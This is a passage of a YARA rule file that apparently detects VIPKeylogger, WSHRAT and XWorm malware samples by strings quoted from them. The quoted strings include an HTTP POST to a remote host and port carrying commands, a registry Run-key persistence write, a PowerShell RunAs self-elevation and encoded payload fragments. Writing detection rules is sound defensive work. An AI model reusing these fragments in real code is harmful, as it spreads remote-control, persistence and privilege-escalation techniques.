      $x11 = "var encoded = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBw" ascii /* score: '37.00'*/
      $x12 = "objhttpdownload.open(\"post\", \"http://\" + host + \":\" + port +\"/\" + command, false);" fullword ascii /* score: '36.00'*/
      $x13 = "objhttpdownload.setRequestHeader(\"user-agent:\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Ge" ascii /* score: '35.00'*/
      $x14 = "    shellobj.RegWrite(\"HKEY_CURRENT_USER\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run\\\\\" + installname.split" ascii /* score: '35.00'*/
      $x15 = "objhttpdownload.setRequestHeader(\"user-agent:\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Ge" ascii /* score: '35.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 27000KB and
      1 of ($x*)
}

rule VIPKeylogger_signature__7f0f1639 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_7f0f1639.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f0f163959167b201b99ebe9695944e5b9c3ac7536fc84023aac565b0c21d3d4"
   strings:
      $s1 = "    For i = 0 To UBound(tempArr) - 1" fullword ascii /* score: '14.00'*/
      $s2 = "Public Const tCqHMPt = \"XLJxxcGET\"" fullword ascii /* score: '14.00'*/
      $s3 = "Public Const HTpytJt = \"hjLogeGan\"" fullword ascii /* score: '14.00'*/
      $s4 = "        For j = 0 To UBound(tempArr) - 1 - i" fullword ascii /* score: '14.00'*/
      $s5 = "Public Const VQfDloGwz = \"Otjljmp\"" fullword ascii /* score: '14.00'*/
      $s6 = "    ReDim tempArr(count - 1)" fullword ascii /* score: '14.00'*/
      $s7 = "dfgdfgdfgdd.Run rFAWsmxEgMne,0" fullword ascii /* score: '13.00'*/
      $s8 = " silent operation" fullword ascii /* score: '11.00'*/
      $s9 = "str = wshNetwork.ComputerName" fullword ascii /* score: '11.00'*/
      $s10 = "Set wshNetwork = WScript.CreateObject(\"WScript\" & \".Network\")" fullword ascii /* score: '10.00'*/
      $s11 = "                tempArr(j) = tempArr(j + 1)" fullword ascii /* score: '10.00'*/
      $s12 = "                tempArr(j + 1) = temp" fullword ascii /* score: '10.00'*/
      $s13 = "'Spddfdfsus associatively ideopfraxist eyebolt nonapostolical;" fullword ascii /* score: '10.00'*/
      $s14 = "  WScript.Quit " fullword ascii /* score: '10.00'*/
      $s15 = "Public Const CevjDAh = \"EeioKTwRd\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2020 and filesize < 50KB and
      8 of them
}

rule WSHRAT_signature__2 {
   meta:
      description = "_subset_batch - file WSHRAT(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6f5cd8e7f08dfac6bad3a43be1b67a2349ddaff8b7a13d84267665e2634f8ce5"
   strings:
      $x1 = "rMSYYjR = rMSYYjR & \"UEsDBBQAAAgAAEUetVCFbDmKLgAAAC4AAAAIAAAAbWltZXR5cGVhcHBsaWNhdGlvbi92bmQub2FzaXMub3BlbmRvY3VtZW50LnNwcmVhZH" ascii /* score: '37.00'*/
      $x2 = "EhmTjVvldqfDhvqxxHLbHeGHILGzwLVLryoJzOJAT = EhmTjVvldqfDhvqxxHLbHeGHILGzwLVLryoJzOJAT & \"VUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUV" ascii /* score: '36.00'*/
      $x3 = "EhmTjVvldqfDhvqxxHLbHeGHILGzwLVLryoJzOJAT = EhmTjVvldqfDhvqxxHLbHeGHILGzwLVLryoJzOJAT & \"b24gZXJyb3IgcmVzdW1lIG5leHQNCkRpbSB3VG" ascii /* score: '35.00'*/
      $x4 = "jMVdrZHNOSFZJTnpaQ1EwZHhLMnMzVGs1SGJFbDFTRGMxVmtkd1dUaEhlVFZDUmpCWmRVVTNOVlpIYkRSMWNqWXJWbXhFU1dwQ056VmFSMncwZFVnM056bERNMWwyY3p" ascii /* base64 encoded string  */ /* score: '31.00'*/
      $x5 = "ZMFZtNDFXSEJ3Y0VadFNGVjFTMjEyV2xSQ0wwZHBkVVpFVTB4SVp6VlRhRFpUT1RGRlR5dHhVV3BDUmpSUk1uWTNRblU1UkhZdk0weHVRMjh5UVZnMFNsSnpkRlZwUkR" ascii /* base64 encoded string  */ /* score: '31.00'*/
      $s6 = "CamVFTk9VR0V5Y1VwbFZUbEJXbWswVmxwaU5qTmhNRTFDUmpkc1YwRmpNUzlxTDA5NFptOTFSR05QUzJKa0t6TTBRVE16ZGpkSk1UWnBiU3RqZVZkYVYzUkxTakphTmp" ascii /* base64 encoded string  */ /* score: '30.00'*/
      $s7 = "GWE5ITldaMEU0ZFVOd01GWlZiWGhMY2pWVVRsQklhMjlPUjNGblUwMHlTMjlJTDBOM1prUjZOM1JQSzA4dlltbDFWMjFTTmpWaVZrdzNjbFZIVGk5TlpFNTVVbFpuV0U" ascii /* base64 encoded string  */ /* score: '29.00'*/
      $s8 = "WTUt6UjJZbWtyZFV4dE5IWk1XUzkwYzJreU5tSmhWSFJ3TmpKdllsWnNkRmRITVdaTVdGcDBaa2N4TDB4WFUzUkZVekJXY2xGWmRFUTJNRGR5VTFOMFRIRjZVWEpPVjN" ascii /* base64 encoded string  */ /* score: '29.00'*/
      $s9 = "kMlZtOTFUR2swZFVwMk5GTjJZa0ZQVlZZM2JWcDFORFEzTmpSMVMzVlJjM0pwTkhKS1JFbDFURkVyZVhKcGVYVk1hWFZyVDBkNWRVeHBkbXRRYURadlltazBkVXhwTkc" ascii /* base64 encoded string  */ /* score: '29.00'*/
      $s10 = "ESk5jSW50aHNuZkF0ZFhqQ0l4aFBSalNaellDS3NRRlRVY1FtakRjeHJOZ2pxVGtTc0h6RXVabGF2Q0lPcVh6V1pnWkFHeFRGVmtZRUNpamdva1JrUkJadXFxcmd1Tkd" ascii /* base64 encoded string  */ /* score: '27.00'*/
      $s11 = "wT2Jrc3paR0prTHpoeVpERk9TRWt4WkdZM2RVNHpUWHBrY2xKNWMzcE5LMlo2Y3k5TWFtUjZUa2hNTlM5WE5ETmplbEo1ZFM5TU9HSnFaSHBPU0VzM09XSmFLemt6VFR" ascii /* base64 encoded string  */ /* score: '27.00'*/
      $s12 = "oNWVrUnViR3M0VTFSSVdFOHpiblp0U0U1a1RVdE9helJKTldkcFowTkZSbEJtWW5ReVFURTJVRGxrUjBSWmVsTmxjVTlvTmpWUlQybGxZbnBwY0hoemVGSmhTR0l6ZVV" ascii /* base64 encoded string  */ /* score: '27.00'*/
      $s13 = "Zd0wyNXBibTh4U0ZCMmFVWjJZbWx5UWtWaWRDOVlhVGxWVFZoek1TdHRjRUZoUWs5bWREQXlORkEyUkdacmMwOHlWR2htTmpGT04xTlljVzlZTjBsaldrSk1URzlIUTB" ascii /* base64 encoded string  */ /* score: '27.00'*/
      $s14 = "0UWFGcEJSMmswZFV4cE5HMHZhRXBHUmpseE9YaG9abTAzYVhsMVRHbDFhMDlLTkZZdmFHOTFUR2swZFVwMk5IVk1hVFIxVEdrMGRVcDFOSFZQVEdnME56WTBkVXQxVVh" ascii /* base64 encoded string  */ /* score: '26.00'*/
      $s15 = "WdllqSkdkM1pYTUVFM1lXaFFLMVkxU0ZaR1NHOXFSVVIwWVZGMlZFWnRWVzFyYWxsdFJtUk5jMGxIUjBKbWNuQmlLMnh3VWxSdE1ISXdRbVJUYjBWb04xTmhWMjh3YzJ" ascii /* base64 encoded string  */ /* score: '26.00'*/
   condition:
      uint16(0) == 0x6e6f and filesize < 8000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f33b4c93781c14708aa075e083392fc19ba00766dee11a9e399ab38cc9963373"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash__0786c616 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash)_0786c616.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0786c6168d1af4331d513dbc1b03433c92ade432a2ba092fd76eb88e70d0b665"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "@4@A%),\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J' */
      $s4 = "nedbrydnings" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash__601f32b1 {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash)_601f32b1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "601f32b18aa001c14d853e81da304279b531160c4180f0bcb4af8be89661a777"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash__618ed66f {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash)_618ed66f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "618ed66f3b0fe7015b6d97248eb17b06cb9b79ba14e05c1839ec54febc7af45d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "Cesseville1" fullword ascii /* score: '10.00'*/
      $s4 = "gvtreyk" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash__a99c9aef {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash)_a99c9aef.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a99c9aef6e24632db04cb1e6ff663819ccc90a4b42149a58f7c77d9b13b2404c"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule VIPKeylogger_signature__56a78d55f3f7af51443e58e0ce2fb5f6_imphash__ae494b9c {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_56a78d55f3f7af51443e58e0ce2fb5f6(imphash)_ae494b9c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae494b9c4d7a4b11d4f6702d7e14cedc21c4739770c51f5bdc0ba95631c52560"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.08</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule XWorm_signature__2 {
   meta:
      description = "_subset_batch - file XWorm(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eba0ae04a46a0ad85aaf03247f675b6bf449f3a92717cf6529de9699b45186e0"
   strings:
      $x1 = "set \"fFiles=C:\\Windows\\System32\\drivers\\anti_cheat.sys C:\\ProgramData\\Games\\Temp\\cache.dat C:\\Users\\%USERNAME%\\AppDa" ascii /* score: '41.00'*/
      $x2 = "set \"fFiles=C:\\Windows\\System32\\drivers\\anti_cheat.sys C:\\ProgramData\\Games\\Temp\\cache.dat C:\\Users\\%USERNAME%\\AppDa" ascii /* score: '41.00'*/
      $s3 = "echo VrfLeew4BHmCf5E1srXHVrZFdBLwOhOKuZ/VwTMHrXL2gCF2tnbbbHs/iSqdPJw7gK7fYbdNjZJovxVtw0TkZAe2oSv6wIvYgRMf06qjrbpxXpl2LfIY0E7+o2e" ascii /* score: '28.00'*/
      $s4 = "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"" fullword ascii /* score: '28.00'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s7 = "set TEMPEXE=%TEMP%\\gi9nmvgkx6.exe" fullword ascii /* score: '26.00'*/
      $s8 = "ZWwAqMiBFAAAAKlpYWFtYKiJaAFpYKlsqKjIgXQAAAFlbW1lZKiouW1kgYgAAAFoAWSpGW1pYKlsgUwAAAAAgYgAAACpGWFgqACBdAAAAIDoAAABaKioyWVsAKlogNQA" ascii /* base64 encoded string  */ /* score: '26.00'*/
      $s9 = "echo 85cPXhEtF6GMxsKI6jzJTMSs8UBmNTUp+mdyB2ur0ytLCXfUCKNRgDLlQRQdC/l1z8TVpabwwVt3ADnKUPtb8GOwnNcFtlhf9ivCRwPh9YUqHrhO6QjJhyZGwr2" ascii /* score: '26.00'*/
      $s10 = "echo /itoo3v5msCANWe2y++asoUbrQ/Wsr2eGRHf2GeHdYSa1ZbohpgI40DJO5XnwPvNmYLq849DIjTaPoGYZL3uRtKrNOQHY61tusEzixEQmiKqb2TX1qHkcaaUjt9" ascii /* score: '26.00'*/
      $s11 = "qACA2AAAAWCAmAAAAAComKlpbW1paWFkqPlogJQAAAFsgRQAAAFtbKjIqID4AAAAqKlgAWioyAFgAW1ggWwAAAAAqIllbKllaWgAqQgBZWVggQgAAACBAAAAAWSouACA" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s12 = "echo YJND63P0HmuR48XaQQnXvnhuE8SiAVtrNMrAtsIhObAVwi7KIZvFHVnVn355dDA8dCuz8MkxIyOaXRKhj2ChAhYkjVch3iZXe6qmL0YmVvWBN2rnhSmRG4NxJgD" ascii /* score: '24.00'*/
      $s13 = "qWlsqJlpYKllaW1haKlIgXgAAAFhZACBBAAAAIDIAAAAAKiZYWVtYAFtbKioiAAAAACpbKioiWABbWFlZWSpGWFggSAAAAFsqWyBaAAAAWioiWltbWwAAAComWgBYKll" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s14 = "AWVlbKjIqKlhYWSogNAAAAComWgAqWABbW1oqNlkqWiAhAAAAAABbWipCKllaWiApAAAAWiBgAAAAKkJaKiApAAAAWyBMAAAAWVoqJgBbWlhYKlgAKiIqWVgAAFpZKkZ" ascii /* base64 encoded string */ /* score: '24.00'*/
      $s15 = "YKipZKjJYICgAAABZWVhbWypGICQAAABaAFggPgAAACpaWSoiAFlZWSpbACpGACoqIFoAAAAgJgAAAFsqKipGWFlaKgBaICUAAAAgQAAAAComWVpZWVtbW1kqNlsqKgA" ascii /* base64 encoded string */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 14000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__04bd676a {
   meta:
      description = "_subset_batch - file XWorm(signature)_04bd676a.tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "04bd676a634ff43518c307d66d941ae474b1919e51780a93159302f82d5a0e3e"
   strings:
      $s1 = "var dimorphous = bedmate.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var shaker = bedmate.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var dustoori = dermatopterous.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var syringia = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var bedmate = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var dermatopterous = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + sticklike + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6952 and filesize < 200KB and
      all of them
}

rule XWorm_signature__3 {
   meta:
      description = "_subset_batch - file XWorm(signature).xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "125e2198ac066f628529dd85d57b3785eac5ae288411d20043ce7854620acbe7"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s3 = "EMAIL:yxe@skswitch.com" fullword ascii /* score: '18.00'*/
      $s4 = "E-MAIL:yxe@skswitch.com" fullword ascii /* score: '18.00'*/
      $s5 = "aaabbbb" wide /* reversed goodware string 'bbbbaaa' */ /* score: '18.00'*/
      $s6 = "4D4B4F4A4E" ascii /* score: '17.00'*/ /* hex encoded string 'MKOJN' */
      $s7 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s8 = "COMMODITY & DESCRIPTION " fullword ascii /* score: '13.00'*/
      $s9 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide /* score: '13.00'*/
      $s10 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s11 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
      $s12 = "xl/printerSettings/printerSettings13.bin" fullword ascii /* score: '10.00'*/
      $s13 = "xl/printerSettings/printerSettings9.bin" fullword ascii /* score: '10.00'*/
      $s14 = "xl/printerSettings/printerSettings12.bin" fullword ascii /* score: '10.00'*/
      $s15 = "xl/printerSettings/printerSettings6.bin" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b5530271 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b5530271.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5530271f10e05e1bf2a67b4d89344c90d6ad746d1c78bf0cf75d9755a9f2ae5"
   strings:
      $s1 = "INSERT INTO tblTranscriptionLog(TranscriptionID,UserID,UserLevel,Status,LineCount,DateModified,version,TemplateID,IP) Values('" fullword wide /* score: '28.00'*/
      $s2 = "Select distinct T.*, TL.*,M.Type,M.Location,CASE WHEN M.Priority = 1 AND (DATEDIFF(MINUTE, M.DateCreated, ISNULL(M.DateModified," wide /* score: '28.00'*/
      $s3 = "Select distinct T.*, M.Type,M.Location,CASE WHEN M.Priority = 1 AND (DATEDIFF(MINUTE, M.DateCreated, ISNULL(M.DateModified, GETD" wide /* score: '28.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADC" fullword ascii /* score: '27.00'*/
      $s5 = "TL.LineCount, TM.duration, P.FirstName + ' ' + P.LastName AS PhyName, A.AccountName, TL.version as Myversion,isnull(EPTL.ErrCri," wide /* score: '27.00'*/
      $s6 = ".pdf' target='_blank'>Download</a>" fullword wide /* score: '23.00'*/
      $s7 = "Select CASE WHEN G.GrpActID IS NOT NULL THEN 'True' ELSE 'False' END ISGroupAccount, G.GrpActName, ISNULL(G.[BillActNumber], A.B" wide /* score: '22.00'*/
      $s8 = "Navgolsandor.exe" fullword wide /* score: '22.00'*/
      $s9 = "secure.emailsrvr.com" fullword wide /* score: '21.00'*/
      $s10 = "Select distinct T.*, M.Type,M.Location,CASE WHEN M.Priority = 1 AND (DATEDIFF(MINUTE, M.DateCreated, ISNULL(M.DateModified, GETD" wide /* score: '21.00'*/
      $s11 = "Select distinct T.*, M.Type,M.TAT,CASE WHEN M.Priority = 1 AND (DATEDIFF(MINUTE, M.DateCreated, ISNULL(M.DateModified, GETDATE()" wide /* score: '21.00'*/
      $s12 = "Select distinct T.*, M.Type,M.Location,CASE WHEN M.Priority = 1 AND (DATEDIFF(MINUTE, M.DateCreated, ISNULL(M.DateModified, GETD" wide /* score: '21.00'*/
      $s13 = "Select distinct T.*, M.Type,M.Location,CASE WHEN M.Priority = 1 AND (DATEDIFF(MINUTE, M.DateCreated, ISNULL(M.DateModified, GETD" wide /* score: '21.00'*/
      $s14 = "getUsersLastLogin" fullword wide /* score: '20.00'*/
      $s15 = "Select SepInvoice, GrpTempName,Description from AdminSecureweb.dbo.tblGrpTemplates where SepInvoice = 'True' and GrpTempID = '" fullword wide /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__112bfbb18727302cb5425c20a464b02e_imphash__0ddf063b {
   meta:
      description = "_subset_batch - file XWorm(signature)_112bfbb18727302cb5425c20a464b02e(imphash)_0ddf063b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ddf063be266344c7dbad9d43d5a9f5e29497a24f41ddaa88f2bdaeadc4b571d"
   strings:
      $s1 = "-theThing.exe" fullword ascii /* score: '19.00'*/
      $s2 = "D$X.exe" fullword ascii /* score: '16.00'*/
      $s3 = "Syka blyat. Fuck all. Made in Russia. Neshta_v3" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule XWorm_signature__4d17be67c8d0394c5c1b8e725359ed89_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_4d17be67c8d0394c5c1b8e725359ed89(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9a657f8a9e75786f58aa9775b5b403544fc15249a22bc13165472f4ec7c20b6b"
   strings:
      $s1 = "353333333353" ascii /* score: '17.00'*/ /* hex encoded string '53333S' */
      $s2 = "* \\T3K6" fullword ascii /* score: '9.00'*/
      $s3 = "owvvvvvv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c2185e4b {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c2185e4b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c2185e4bb84ffb80828739627e5a5dd81327a03388f68c9cc9d86193aa714fe5"
   strings:
      $s1 = "CLs.exe" fullword wide /* score: '19.00'*/
      $s2 = "get_YouTube_Logo" fullword ascii /* score: '14.00'*/
      $s3 = "GetPlainTextContent" fullword ascii /* score: '14.00'*/
      $s4 = "get_PlainTextContent" fullword ascii /* score: '14.00'*/
      $s5 = "Export Complete" fullword wide /* score: '12.00'*/
      $s6 = "SmartNote - Intelligent Note Manager" fullword wide /* score: '12.00'*/
      $s7 = "CLs.pdb" fullword ascii /* score: '11.00'*/
      $s8 = "Text files (*.txt)|*.txt|HTML files (*.html)|*.html" fullword wide /* score: '11.00'*/
      $s9 = "Error exporting notes: " fullword wide /* score: '10.00'*/
      $s10 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
      $s11 = "get_ModifiedDate" fullword ascii /* score: '9.00'*/
      $s12 = "VelvetCircuitOracle" fullword ascii /* score: '9.00'*/
      $s13 = "GetRecentNotes" fullword ascii /* score: '9.00'*/
      $s14 = "<GetNotesByTag>b__0" fullword ascii /* score: '9.00'*/
      $s15 = "<GetNotesByTag>b__13_2" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__08761722 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_08761722.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "08761722c1c51fe2f880bad2c5a2ec108dcf5c398a3e2a2bdda3b16afd45d36d"
   strings:
      $s1 = "nwNn.exe" fullword wide /* score: '22.00'*/
      $s2 = "nwNn.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s4 = "SetBinaryOperation" fullword ascii /* score: '12.00'*/
      $s5 = "{0:HH:mm:ss} - {1}" fullword wide /* score: '12.00'*/
      $s6 = "Export Complete" fullword wide /* score: '12.00'*/
      $s7 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s8 = "Calculator Plus - History Export" fullword wide /* score: '11.00'*/
      $s9 = "LogBase10" fullword ascii /* score: '10.00'*/
      $s10 = "CalculatorHistory_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '10.00'*/
      $s11 = "Error exporting history: " fullword wide /* score: '10.00'*/
      $s12 = "<Operand2>k__BackingField" fullword ascii /* score: '9.00'*/
      $s13 = "ghostSeed" fullword ascii /* score: '9.00'*/
      $s14 = "CreateOperatorButtons" fullword ascii /* score: '9.00'*/
      $s15 = "CreateBasicOperatorButtons" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c1c3a8a1 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c1c3a8a1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1c3a8a19d9dd097c564558ac44ede7c45c574833dbb2ba009ecbc0e45e818a1"
   strings:
      $s1 = "brRd.exe" fullword wide /* score: '22.00'*/
      $s2 = "brRd.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "statistics.dat" fullword wide /* score: '14.00'*/
      $s4 = "highscores.dat" fullword wide /* score: '14.00'*/
      $s5 = "Export Complete" fullword wide /* score: '12.00'*/
      $s6 = "GetAverageCompletionTime" fullword ascii /* score: '12.00'*/
      $s7 = "get_GamesCompleted" fullword ascii /* score: '12.00'*/
      $s8 = "get_CompletionTimes" fullword ascii /* score: '12.00'*/
      $s9 = "GetCompletionRate" fullword ascii /* score: '12.00'*/
      $s10 = "<GetAverageCompletionTime>b__32_0" fullword ascii /* score: '12.00'*/
      $s11 = "get_CompletionTime" fullword ascii /* score: '12.00'*/
      $s12 = "get_TotalGamesCompleted" fullword ascii /* score: '12.00'*/
      $s13 = "{0} - {1:mm\\:ss} - Score: {2}" fullword wide /* score: '12.00'*/
      $s14 = "Game Started - {0} Difficulty" fullword wide /* score: '12.00'*/
      $s15 = "Grid is valid - {0} cells remaining" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7272849f {
   meta:
